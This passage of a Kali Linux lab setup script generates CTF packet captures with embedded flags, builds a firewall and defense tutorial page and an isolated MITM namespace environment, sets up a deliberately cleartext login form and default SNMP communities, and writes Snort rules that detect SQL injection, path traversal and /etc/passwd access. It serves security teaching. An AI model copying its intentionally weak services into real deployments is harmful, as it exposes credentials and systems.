    packets.append(IP(src=client_ip, dst=server_ip)/TCP(sport=49152, dport=445, flags="A"))

    # SMB Negotiate (simplified)
    smb_negotiate = b"\x00\x00\x00\x45"  # NetBIOS header
    smb_negotiate += b"\xffSMB"  # SMB header
    smb_negotiate += b"\x72"  # Negotiate command
    smb_negotiate += b"\x00" * 20  # Padding
    packets.append(IP(src=client_ip, dst=server_ip)/TCP(sport=49152, dport=445, flags="PA")/Raw(load=smb_negotiate))

    # SMB Session Setup with flag in payload
    flag_data = b"Share enumeration: C$, ADMIN$, IPC$, SECRET$ - FLAG{smb_sh4r3_3num3r4t3d}"
    smb_shares = b"\x00\x00\x00" + bytes([len(flag_data) + 10])
    smb_shares += b"\xffSMB"
    smb_shares += b"\x25"  # Tree Connect
    smb_shares += flag_data

    packets.append(IP(src=server_ip, dst=client_ip)/TCP(sport=445, dport=49152, flags="PA")/Raw(load=smb_shares))

    wrpcap(f"{PCAP_DIR}/challenge7_smb.pcap", packets)
    print(f"    Saved: {PCAP_DIR}/challenge7_smb.pcap")

def create_telnet_pcap():
    """Challenge 8: Telnet session with cleartext credentials"""
    print("[*] Creating Challenge 8: Telnet Session")

    packets = []
    client_ip = "192.168.1.100"
    server_ip = "192.168.1.1"

    # TCP handshake
    packets.append(IP(src=client_ip, dst=server_ip)/TCP(sport=50000, dport=23, flags="S", seq=1000))
    packets.append(IP(src=server_ip, dst=client_ip)/TCP(sport=23, dport=50000, flags="SA", seq=2000, ack=1001))
    packets.append(IP(src=client_ip, dst=server_ip)/TCP(sport=50000, dport=23, flags="A", seq=1001, ack=2001))

    # Telnet banner
    packets.append(IP(src=server_ip, dst=client_ip)/TCP(sport=23, dport=50000, flags="PA")/Raw(load=b"Welcome to Lab Server\r\nlogin: "))

    # Username (sent character by character in real telnet, but simplified here)
    packets.append(IP(src=client_ip, dst=server_ip)/TCP(sport=50000, dport=23, flags="PA")/Raw(load=b"admin\r\n"))

    # Password prompt
    packets.append(IP(src=server_ip, dst=client_ip)/TCP(sport=23, dport=50000, flags="PA")/Raw(load=b"Password: "))

    # Password (the flag!)
    packets.append(IP(src=client_ip, dst=server_ip)/TCP(sport=50000, dport=23, flags="PA")/Raw(load=b"FLAG{t3ln3t_cr3ds_c4ptur3d}\r\n"))

    # Login success
    packets.append(IP(src=server_ip, dst=client_ip)/TCP(sport=23, dport=50000, flags="PA")/Raw(load=b"\r\nLogin successful!\r\nlab-server$ "))

    wrpcap(f"{PCAP_DIR}/challenge8_telnet.pcap", packets)
    print(f"    Saved: {PCAP_DIR}/challenge8_telnet.pcap")

if __name__ == "__main__":
    os.makedirs(PCAP_DIR, exist_ok=True)
    print("=== Additional PCAP Challenge Generator ===\n")

    create_icmp_tunnel_pcap()
    create_smb_pcap()
    create_telnet_pcap()

    print("\n[+] Additional PCAP files generated!")
ADDPCAP_EOF

    chmod +x "${SCRIPTS_DIR}/forensics/generate_additional_pcaps.py"

    log "Running additional PCAP generator..."
    python3 "${SCRIPTS_DIR}/forensics/generate_additional_pcaps.py" 2>/dev/null || warn "Additional PCAP generation requires scapy"

    log "Additional PCAP challenges created"
}

#===============================================================================
# Defense Lab
#===============================================================================

create_defense_lab() {
    header "Creating Defense Lab"

    mkdir -p "${WEB_ROOT}/defense-lab"

    cat > "${WEB_ROOT}/defense-lab/index.html" << 'DEFENSE_EOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Firewall & Defense Lab</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', sans-serif; background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%); min-height: 100vh; color: #e4e4e4; padding: 20px; }
        .container { max-width: 1200px; margin: 0 auto; }
        h1 { color: #2ecc71; margin-bottom: 10px; }
        .back-link { color: #00d9ff; text-decoration: none; margin-bottom: 20px; display: inline-block; }
        .section { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 10px; padding: 25px; margin: 20px 0; }
        h2 { color: #2ecc71; margin-bottom: 15px; border-bottom: 2px solid #2ecc71; padding-bottom: 10px; }
        h3 { color: #f39c12; margin: 20px 0 10px; }
        pre { background: #0d1117; border: 1px solid #30363d; border-radius: 8px; padding: 15px; overflow-x: auto; font-family: monospace; }
        code { color: #58a6ff; }
        .comment { color: #8b949e; }
        .warning { background: rgba(231,76,60,0.2); border-left: 4px solid #e74c3c; padding: 15px; margin: 15px 0; border-radius: 0 8px 8px 0; }
        .tip { background: rgba(46,204,113,0.2); border-left: 4px solid #2ecc71; padding: 15px; margin: 15px 0; border-radius: 0 8px 8px 0; }
        .exercise { background: rgba(52,152,219,0.2); border-left: 4px solid #3498db; padding: 15px; margin: 15px 0; border-radius: 0 8px 8px 0; }
        .exercise h4 { color: #3498db; margin-bottom: 10px; }
        ul, ol { margin-left: 20px; line-height: 1.8; }
        table { width: 100%; border-collapse: collapse; margin: 15px 0; }
        th, td { padding: 10px; text-align: left; border-bottom: 1px solid #333; }
        th { background: rgba(0,0,0,0.3); }
    </style>
</head>
<body>
    <div class="container">
        <a href="../" class="back-link">&larr; Back to Labs</a>
        <h1>&#128737; Firewall & Defense Lab</h1>
        <p style="color: #888; margin-bottom: 20px;">Learn defensive security: firewalls, monitoring, and log analysis</p>

        <div class="section">
            <h2>IPTables Fundamentals</h2>

            <h3>Chain Concepts</h3>
            <table>
                <tr><th>Chain</th><th>Purpose</th><th>When Applied</th></tr>
                <tr><td>INPUT</td><td>Incoming traffic to this host</td><td>Packets destined for local processes</td></tr>
                <tr><td>OUTPUT</td><td>Outgoing traffic from this host</td><td>Packets generated by local processes</td></tr>
                <tr><td>FORWARD</td><td>Traffic passing through</td><td>Packets routed through (not for this host)</td></tr>
            </table>

            <h3>Basic Syntax</h3>
            <pre><code>iptables -A [CHAIN] -p [PROTOCOL] --dport [PORT] -j [ACTION]

<span class="comment"># Common actions:</span>
-j ACCEPT   <span class="comment"># Allow the packet</span>
-j DROP     <span class="comment"># Silently discard</span>
-j REJECT   <span class="comment"># Discard and send error</span>
-j LOG      <span class="comment"># Log to syslog</span></code></pre>

            <h3>View Current Rules</h3>
            <pre><code><span class="comment"># List all rules with line numbers</span>
sudo iptables -L -n -v --line-numbers

<span class="comment"># List specific chain</span>
sudo iptables -L INPUT -n -v

<span class="comment"># List NAT table</span>
sudo iptables -t nat -L -n</code></pre>
        </div>

        <div class="section">
            <h2>Firewall Exercises</h2>

            <div class="exercise">
                <h4>Exercise 1: Block All Except SSH</h4>
                <p>Configure firewall to only allow SSH (port 22) access:</p>
                <pre><code><span class="comment"># Flush existing rules</span>
sudo iptables -F

<span class="comment"># Set default policies</span>
sudo iptables -P INPUT DROP
sudo iptables -P FORWARD DROP
sudo iptables -P OUTPUT ACCEPT

<span class="comment"># Allow loopback</span>
sudo iptables -A INPUT -i lo -j ACCEPT

<span class="comment"># Allow established connections</span>
sudo iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

<span class="comment"># Allow SSH</span>
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT

<span class="comment"># Verify with: nmap localhost</span></code></pre>
            </div>

            <div class="exercise">
                <h4>Exercise 2: Rate Limit SSH</h4>
                <p>Prevent SSH brute force by limiting connection attempts:</p>
                <pre><code><span class="comment"># Limit SSH to 3 connections per minute per IP</span>
sudo iptables -A INPUT -p tcp --dport 22 -m state --state NEW \
    -m recent --set --name SSH

sudo iptables -A INPUT -p tcp --dport 22 -m state --state NEW \
    -m recent --update --seconds 60 --hitcount 4 --name SSH -j DROP

<span class="comment"># Test: Try connecting rapidly</span>
for i in {1..10}; do ssh -o ConnectTimeout=1 localhost; done</code></pre>
            </div>

            <div class="exercise">
                <h4>Exercise 3: Log and Drop Port Scans</h4>
                <pre><code><span class="comment"># Log suspicious SYN packets</span>
sudo iptables -A INPUT -p tcp --syn -m limit --limit 1/s \
    --limit-burst 4 -j ACCEPT

sudo iptables -A INPUT -p tcp --syn -j LOG \
    --log-prefix "PORTSCAN: " --log-level 4

sudo iptables -A INPUT -p tcp --syn -j DROP

<span class="comment"># View logs</span>
sudo tail -f /var/log/syslog | grep PORTSCAN</code></pre>
            </div>

            <div class="exercise">
                <h4>Exercise 4: Block Specific IP</h4>
                <pre><code><span class="comment"># Block single IP</span>
sudo iptables -A INPUT -s 10.0.0.100 -j DROP

<span class="comment"># Block IP range</span>
sudo iptables -A INPUT -s 10.0.0.0/24 -j DROP

<span class="comment"># Block with logging</span>
sudo iptables -A INPUT -s 10.0.0.100 -j LOG --log-prefix "BLOCKED: "
sudo iptables -A INPUT -s 10.0.0.100 -j DROP</code></pre>
            </div>

            <div class="exercise">
                <h4>Exercise 5: Save and Restore Rules</h4>
                <pre><code><span class="comment"># Save current rules</span>
sudo iptables-save > /tmp/firewall-rules.txt

<span class="comment"># View saved rules</span>
cat /tmp/firewall-rules.txt

<span class="comment"># Restore rules</span>
sudo iptables-restore < /tmp/firewall-rules.txt

<span class="comment"># Make persistent (Debian/Ubuntu)</span>
sudo apt install iptables-persistent
sudo netfilter-persistent save</code></pre>
            </div>
        </div>

        <div class="section">
            <h2>Log Analysis</h2>

            <h3>SSH Authentication Logs</h3>
            <pre><code><span class="comment"># View SSH login attempts</span>
sudo grep "sshd" /var/log/auth.log | tail -50

<span class="comment"># Find failed logins</span>
sudo grep "Failed password" /var/log/auth.log

<span class="comment"># Count failed attempts per IP</span>
sudo grep "Failed password" /var/log/auth.log | \
    awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -10

<span class="comment"># Find successful logins</span>
sudo grep "Accepted" /var/log/auth.log</code></pre>

            <h3>Apache Access Logs</h3>
            <pre><code><span class="comment"># View recent requests</span>
sudo tail -100 /var/log/apache2/access.log

<span class="comment"># Find SQL injection attempts</span>
sudo grep -i "union\|select\|insert\|drop\|delete" /var/log/apache2/access.log

<span class="comment"># Find path traversal attempts</span>
sudo grep "\.\.\/" /var/log/apache2/access.log

<span class="comment"># Count requests per IP</span>
sudo awk '{print $1}' /var/log/apache2/access.log | \
    sort | uniq -c | sort -rn | head -10

<span class="comment"># Find 404 errors (scanning indicators)</span>
sudo grep " 404 " /var/log/apache2/access.log | \
    awk '{print $1}' | sort | uniq -c | sort -rn</code></pre>
        </div>

        <div class="section">
            <h2>Network Monitoring</h2>

            <h3>ARP Spoofing Detection</h3>
            <pre><code><span class="comment"># Install arpwatch</span>
sudo apt install arpwatch

<span class="comment"># Start monitoring</span>
sudo arpwatch -i eth0

<span class="comment"># View ARP changes</span>
sudo tail -f /var/log/syslog | grep arpwatch

<span class="comment"># Manual ARP table monitoring</span>
watch -n 1 'arp -a'

<span class="comment"># Detect duplicate MACs (spoofing indicator)</span>
arp -a | awk '{print $4}' | sort | uniq -d</code></pre>

            <h3>Connection Monitoring</h3>
            <pre><code><span class="comment"># Active connections</span>
ss -tunapl

<span class="comment"># Listening ports</span>
ss -tlnp

<span class="comment"># Established connections</span>
ss -tn state established

<span class="comment"># Connections by state</span>
ss -s

<span class="comment"># Watch for new connections</span>
watch -n 1 'ss -tn | wc -l'</code></pre>

            <h3>Using fail2ban</h3>
            <pre><code><span class="comment"># Install fail2ban</span>
sudo apt install fail2ban

<span class="comment"># Start service</span>
sudo systemctl start fail2ban
sudo systemctl enable fail2ban

<span class="comment"># Check status</span>
sudo fail2ban-client status

<span class="comment"># Check SSH jail</span>
sudo fail2ban-client status sshd

<span class="comment"># Unban an IP</span>
sudo fail2ban-client set sshd unbanip 10.0.0.100

<span class="comment"># View banned IPs</span>
sudo iptables -L f2b-sshd -n</code></pre>
        </div>

        <div class="section">
            <h2>Defense Checklist</h2>
            <ul>
                <li>&#9744; Default deny firewall policy</li>
                <li>&#9744; Only necessary ports open</li>
                <li>&#9744; Rate limiting on SSH/login services</li>
                <li>&#9744; fail2ban configured and running</li>
                <li>&#9744; Log monitoring in place</li>
                <li>&#9744; ARP monitoring enabled</li>
                <li>&#9744; Regular log review process</li>
                <li>&#9744; Firewall rules backed up</li>
                <li>&#9744; HIDS/NIDS deployed (Snort/Suricata)</li>
            </ul>
        </div>

        <div class="tip">
            <strong>&#128161; Defense in Depth:</strong>
            <p>Never rely on a single security control. Layer your defenses:</p>
            <ul>
                <li><strong>Network:</strong> Firewall, IDS/IPS, network segmentation</li>
                <li><strong>Host:</strong> fail2ban, AppArmor/SELinux, updates</li>
                <li><strong>Application:</strong> Input validation, WAF, secure coding</li>
                <li><strong>Monitoring:</strong> Log aggregation, alerting, SIEM</li>
            </ul>
        </div>
    </div>
</body>
</html>
DEFENSE_EOF

    log "Defense lab created"
}

#===============================================================================
# MITM Environment Setup
#===============================================================================

create_mitm_environment() {
    header "Creating MITM Isolated Environment"

    cat > "${SCRIPTS_DIR}/mitm/setup-mitm-env.sh" << 'MITMENV_EOF'
#!/bin/bash
#===============================================================================
# MITM Lab Isolated Environment Setup
# Creates network namespaces for safe MITM practice
#===============================================================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

# Network configuration
BRIDGE="br-mitm"
NS_VICTIM="victim_ns"
NS_ATTACKER="attacker_ns"
NS_GATEWAY="gateway_ns"

VICTIM_IP="10.0.0.2/24"
ATTACKER_IP="10.0.0.3/24"
GATEWAY_IP="10.0.0.1/24"

start_environment() {
    echo -e "${GREEN}[+] Starting MITM Lab Environment${NC}"

    # Clean up any stale interfaces first
    echo "[*] Cleaning up stale interfaces..."
    ip netns del $NS_VICTIM 2>/dev/null
    ip netns del $NS_ATTACKER 2>/dev/null
    ip netns del $NS_GATEWAY 2>/dev/null
    ip link del veth-vic-br 2>/dev/null
    ip link del veth-atk-br 2>/dev/null
    ip link del veth-gw-br 2>/dev/null
    ip link set $BRIDGE down 2>/dev/null
    ip link del $BRIDGE 2>/dev/null

    # Create bridge
    echo "[*] Creating bridge..."
    ip link add name $BRIDGE type bridge
    ip link set $BRIDGE up
    ip addr add 10.0.0.254/24 dev $BRIDGE

    # Create namespaces
    echo "[*] Creating network namespaces..."
    ip netns add $NS_VICTIM
    ip netns add $NS_ATTACKER
    ip netns add $NS_GATEWAY

    # Create veth pairs
    echo "[*] Creating virtual interfaces..."
    ip link add veth-vic type veth peer name veth-vic-br
    ip link add veth-atk type veth peer name veth-atk-br
    ip link add veth-gw type veth peer name veth-gw-br

    # Move interfaces to namespaces
    ip link set veth-vic netns $NS_VICTIM
    ip link set veth-atk netns $NS_ATTACKER
    ip link set veth-gw netns $NS_GATEWAY

    # Connect bridge ports
    ip link set veth-vic-br master $BRIDGE
    ip link set veth-atk-br master $BRIDGE
    ip link set veth-gw-br master $BRIDGE

    # Bring up bridge ports
    ip link set veth-vic-br up
    ip link set veth-atk-br up
    ip link set veth-gw-br up

    # Configure victim namespace
    echo "[*] Configuring victim namespace..."
    ip netns exec $NS_VICTIM ip addr add $VICTIM_IP dev veth-vic
    ip netns exec $NS_VICTIM ip link set veth-vic up
    ip netns exec $NS_VICTIM ip link set lo up
    ip netns exec $NS_VICTIM ip route add default via 10.0.0.1

    # Configure attacker namespace
    echo "[*] Configuring attacker namespace..."
    ip netns exec $NS_ATTACKER ip addr add $ATTACKER_IP dev veth-atk
    ip netns exec $NS_ATTACKER ip link set veth-atk up
    ip netns exec $NS_ATTACKER ip link set lo up
    ip netns exec $NS_ATTACKER ip route add default via 10.0.0.1

    # Configure gateway namespace
    echo "[*] Configuring gateway namespace..."
    ip netns exec $NS_GATEWAY ip addr add $GATEWAY_IP dev veth-gw
    ip netns exec $NS_GATEWAY ip link set veth-gw up
    ip netns exec $NS_GATEWAY ip link set lo up

    # Enable forwarding in gateway
    ip netns exec $NS_GATEWAY sysctl -w net.ipv4.ip_forward=1 > /dev/null

    echo -e "${GREEN}[+] Environment ready!${NC}"
    echo ""
    echo "Usage:"
    echo "  Enter victim:   sudo ip netns exec $NS_VICTIM bash"
    echo "  Enter attacker: sudo ip netns exec $NS_ATTACKER bash"
    echo "  Enter gateway:  sudo ip netns exec $NS_GATEWAY bash"
    echo ""
    echo "IP Addresses:"
    echo "  Victim:   10.0.0.2"
    echo "  Attacker: 10.0.0.3"
    echo "  Gateway:  10.0.0.1"
}

stop_environment() {
    echo -e "${YELLOW}[*] Stopping MITM Lab Environment${NC}"

    # Delete namespaces (this also removes veth interfaces inside them)
    ip netns del $NS_VICTIM 2>/dev/null
    ip netns del $NS_ATTACKER 2>/dev/null
    ip netns del $NS_GATEWAY 2>/dev/null

    # Delete remaining veth interfaces
    ip link del veth-vic-br 2>/dev/null
    ip link del veth-atk-br 2>/dev/null
    ip link del veth-gw-br 2>/dev/null

    # Delete bridge
    ip link set $BRIDGE down 2>/dev/null
    ip link del $BRIDGE 2>/dev/null

    echo -e "${GREEN}[+] Environment cleaned up${NC}"
}

status_environment() {
    echo "=== MITM Lab Environment Status ==="
    echo ""

    if ip netns list | grep -q $NS_ATTACKER; then
        echo -e "${GREEN}[+] Environment is RUNNING${NC}"
        echo ""
        echo "Namespaces:"
        ip netns list | grep -E "(victim|attacker|gateway)"
        echo ""
        echo "Bridge:"
        ip link show $BRIDGE 2>/dev/null || echo "  Not found"
    else
        echo -e "${YELLOW}[-] Environment is NOT running${NC}"
        echo "    Start with: $0 start"
    fi
}

case "$1" in
    start)
        start_environment
        ;;
    stop)
        stop_environment
        ;;
    restart)
        stop_environment
        sleep 1
        start_environment
        ;;
    status)
        status_environment
        ;;
    *)
        echo "Usage: $0 {start|stop|restart|status}"
        exit 1
        ;;
esac
MITMENV_EOF

    chmod +x "${SCRIPTS_DIR}/mitm/setup-mitm-env.sh"
    log "MITM environment script created"
}

#===============================================================================
# Configure Services
#===============================================================================

configure_services() {
    header "Configuring Lab Services"

    # Configure vsftpd
    log "Configuring FTP server..."
    if [ -f /etc/vsftpd.conf ]; then
        cp /etc/vsftpd.conf /etc/vsftpd.conf.bak

        # Create FTP test file
        mkdir -p /var/ftp/pub
        echo "This is a test file for FTP lab exercises." > /var/ftp/pub/readme.txt
        echo "FLAG{ftp_f1l3_r3c0v3r3d_s3cr3t}" > /var/ftp/pub/secret.txt
        chmod 644 /var/ftp/pub/*.txt
    fi

    # Configure dnsmasq (for DNS spoofing lab)
    log "Configuring DNS server..."
    mkdir -p /etc/dnsmasq.d
    cat > /etc/dnsmasq.d/network-labs.conf << 'DNSMASQ_EOF'
# Network Labs DNS Configuration
# This file is for the isolated MITM lab environment

# Listen only on localhost for safety
listen-address=127.0.0.1

# Log queries for analysis
log-queries

# Cache size
cache-size=1000
DNSMASQ_EOF

    # Configure Apache for lab exercises
    log "Configuring web server..."
    cat > "${WEB_ROOT}/login.php" << 'LOGIN_EOF'
<?php
// Simple login form for traffic analysis practice
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $user = $_POST['username'] ?? '';
    $pass = $_POST['password'] ?? '';
    // Log for educational purposes
    error_log("Login attempt: user=$user");
    echo "<h1>Login received</h1>";
    echo "<p>Check your packet capture!</p>";
} else {
?>
<!DOCTYPE html>
<html>
<head><title>Login Test</title></head>
<body style="background: #1a1a2e; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh;">
    <form method="POST" style="background: #16213e; padding: 30px; border-radius: 10px;">
        <h2>Test Login</h2>
        <p>This form sends credentials in cleartext for capture practice</p>
        <input type="text" name="username" placeholder="Username" style="display: block; margin: 10px 0; padding: 10px; width: 200px;"><br>
        <input type="password" name="password" placeholder="Password" style="display: block; margin: 10px 0; padding: 10px; width: 200px;"><br>
        <button type="submit" style="padding: 10px 20px; background: #e74c3c; color: #fff; border: none; cursor: pointer;">Login</button>
    </form>
</body>
</html>
<?php } ?>
LOGIN_EOF

    # Configure SNMP
    log "Configuring SNMP..."
    if [ -f /etc/snmp/snmpd.conf ]; then
        cp /etc/snmp/snmpd.conf /etc/snmp/snmpd.conf.bak

        # Add read-only community for testing
        echo "rocommunity public localhost" >> /etc/snmp/snmpd.conf
        echo "rocommunity labtest localhost" >> /etc/snmp/snmpd.conf
    fi

    log "Services configured"
}

#===============================================================================
# Create IDS Rules
#===============================================================================

create_ids_rules() {
    header "Creating IDS Rules"

    mkdir -p /etc/snort/rules

    cat > /etc/snort/rules/local.rules << 'SNORT_EOF'
# =============================================================================
# Network Labs - Custom Snort Rules
# =============================================================================

# Port Scan Detection
alert tcp any any -> $HOME_NET any (msg:"PORTSCAN: SYN Scan Detected"; flags:S; threshold:type threshold, track by_src, count 20, seconds 5; classtype:attempted-recon; sid:1000010; rev:1;)

# SQL Injection Detection
alert tcp any any -> $HOME_NET 80 (msg:"SQLI: UNION SELECT Attempt"; flow:to_server,established; content:"UNION"; nocase; content:"SELECT"; nocase; classtype:web-application-attack; sid:1000020; rev:1;)
alert tcp any any -> $HOME_NET 80 (msg:"SQLI: OR 1=1 Attempt"; flow:to_server,established; pcre:"/OR\s+[\'\"]?\d+[\'\"]?\s*=\s*[\'\"]?\d+/i"; classtype:web-application-attack; sid:1000021; rev:1;)

# Brute Force Detection
alert tcp any any -> $HOME_NET 22 (msg:"BRUTEFORCE: SSH Login Attempts"; flow:to_server; threshold:type threshold, track by_src, count 5, seconds 60; classtype:attempted-admin; sid:1000030; rev:1;)
alert tcp any any -> $HOME_NET 21 (msg:"BRUTEFORCE: FTP Login Attempts"; flow:to_server; content:"USER"; threshold:type threshold, track by_src, count 5, seconds 60; classtype:attempted-admin; sid:1000031; rev:1;)

# Data Exfiltration
alert tcp $HOME_NET any -> $EXTERNAL_NET any (msg:"EXFIL: Large Outbound Transfer"; flow:to_server,established; dsize:>10000; classtype:policy-violation; sid:1000040; rev:1;)

# DNS Tunneling
alert udp $HOME_NET any -> any 53 (msg:"TUNNEL: Suspicious DNS Query Length"; content:"|00 01 00 00|"; offset:4; depth:4; dsize:>100; classtype:policy-violation; sid:1000050; rev:1;)

# ICMP Flood
alert icmp any any -> $HOME_NET any (msg:"DOS: ICMP Flood"; threshold:type threshold, track by_src, count 50, seconds 10; classtype:attempted-dos; sid:1000060; rev:1;)

# Path Traversal
alert tcp any any -> $HOME_NET 80 (msg:"ATTACK: Path Traversal Attempt"; flow:to_server,established; content:"../"; classtype:web-application-attack; sid:1000070; rev:1;)
alert tcp any any -> $HOME_NET 80 (msg:"ATTACK: /etc/passwd Access"; flow:to_server,established; content:"/etc/passwd"; classtype:web-application-attack; sid:1000071; rev:1;)
SNORT_EOF

    log "IDS rules created at /etc/snort/rules/local.rules"
}

#===============================================================================
# Print Summary
#===============================================================================

print_summary() {
    echo ""
    echo -e "${PURPLE}================================================================${NC}"
    echo -e "${PURPLE}     Network Analysis Labs - Setup Complete!${NC}"
    echo -e "${PURPLE}================================================================${NC}"
    echo ""
    echo -e "${GREEN}Web Dashboard:${NC} http://localhost/network-labs/"
    echo ""
    echo -e "${CYAN}Lab Modules:${NC}"
    echo "  1. Packet Crafting (Scapy)"
    echo "  2. Man-in-the-Middle"
    echo "  3. Network Forensics (8 CTF challenges)"
    echo "  4. Protocol Deep-Dive"
    echo "  5. Active Reconnaissance"
    echo "  6. Traffic Generation"
    echo "  7. Intrusion Detection"
    echo "  8. Wireless Concepts"
    echo "  9. Firewall & Defense"
    echo ""
    echo -e "${CYAN}Key Locations:${NC}"
    echo "  Web Root:     ${WEB_ROOT}"
    echo "  Scripts:      ${SCRIPTS_DIR}"
    echo "  Scapy Tools:  ${SCRIPTS_DIR}/scapy/"
    echo "  PCAP Files:   ${PCAP_DIR}"
    echo "  IDS Rules:    /etc/snort/rules/local.rules"
    echo ""
    echo -e "${CYAN}Quick Start Commands:${NC}"
    echo "  Start Apache:        sudo systemctl start apache2"
    echo "  Start FTP:           sudo systemctl start vsftpd"
    echo "  Start MITM Env:      sudo ${SCRIPTS_DIR}/mitm/setup-mitm-env.sh start"
    echo "  Generate Traffic:    sudo python3 ${SCRIPTS_DIR}/traffic/traffic-generator.py --all"
    echo "  Validate Flags:      python3 ${SCRIPTS_DIR}/forensics/pcap-validator.py 1 'FLAG{...}'"
    echo ""
    echo -e "${YELLOW}Safety Reminders:${NC}"
    echo "  - All MITM exercises use isolated network namespaces"
    echo "  - Never attack networks you don't own"
    echo "  - These tools are for educational purposes only"
    echo ""
    echo -e "${GREEN}Happy Learning!${NC}"
    echo ""
}

#===============================================================================
# Main Execution
#===============================================================================

main() {
    check_root

    echo ""
    echo -e "${PURPLE}================================================================${NC}"
    echo -e "${PURPLE}     Network Analysis Labs Setup Script${NC}"
    echo -e "${PURPLE}     Kali Linux Edition${NC}"
    echo -e "${PURPLE}================================================================${NC}"
    echo ""

    # Create log file
    touch "$LOG_FILE"
    log "Starting setup..."

    # Run setup functions
    install_packages
    setup_directories
    create_main_dashboard
    create_scapy_lab
    create_mitm_lab
    create_forensics_lab
    create_protocol_lab
    create_recon_lab
    create_traffic_lab
    create_ids_lab
    create_wireless_lab
    create_defense_lab
    generate_pcap_challenges
    generate_additional_pcaps
    create_wireless_samples
    create_helper_scripts
    create_scapy_scripts
    create_mitm_environment
    configure_services
    create_ids_rules

    # Start Apache if not running
    systemctl enable apache2 2>/dev/null
    systemctl start apache2 2>/dev/null

    print_summary

    log "Setup completed successfully"
}

# Run main function
main "$@"
